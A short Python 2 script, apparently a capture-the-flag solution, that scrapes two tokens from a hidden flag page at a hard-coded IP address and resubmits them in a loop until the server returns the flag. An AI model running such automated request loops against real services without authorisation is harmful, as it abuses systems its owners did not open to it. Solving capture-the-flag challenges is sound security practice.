import os
import requests

url = 'http://104.199.235.135:31332/_hidden_flag_.php'

resp = requests.get(url)


def parse(resp):
    t = resp.text.split('"')

    c = t[13]
    s = t[19]
    return c, s

c, s = parse(resp)

while True:

    resp = requests.post(url, data = {'c': c, 's': s})

    if 'no flag here!' not in resp.text:
        print resp.text
        print resp.headers
        print c, s
        break

    c, s = parse(resp)

